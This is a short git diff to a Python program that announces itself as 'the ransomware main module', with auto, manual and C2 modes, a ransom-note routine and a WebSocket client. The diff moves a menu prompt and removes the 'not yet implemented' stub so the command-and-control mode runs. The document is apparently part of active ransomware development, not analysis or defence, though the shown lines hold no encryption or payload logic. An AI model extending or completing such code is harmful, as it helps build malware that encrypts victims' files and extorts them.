@@ -22,11 +22,11 @@ class Program():
         
     async def start(self):
         print("This is the ransomware main module.")
-        print("What would you like to do?")
         match self.__mode__:
             case "auto":
                 self.__auto_mode()
             case "manual":
+                print("What would you like to do?")
                 await self.__cli()
             case "c2":
                 await self.__c2_mode()
@@ -37,7 +37,6 @@ class Program():
                 print("Stopping C2 connection...")
                 if self.__client is not None:
                     await self.__client.stop()
-
             case "auto":
                 pass
             case "manual":
@@ -322,7 +321,6 @@ class Program():
         self.__ransomnote()
 
     async def __c2_mode(self):
-        print("C2 mode is not yet implemented.")
         self.__envcheck()
         self.__client = WebsocketClient(username=self.__system__, 
                         system=self.__system__, 
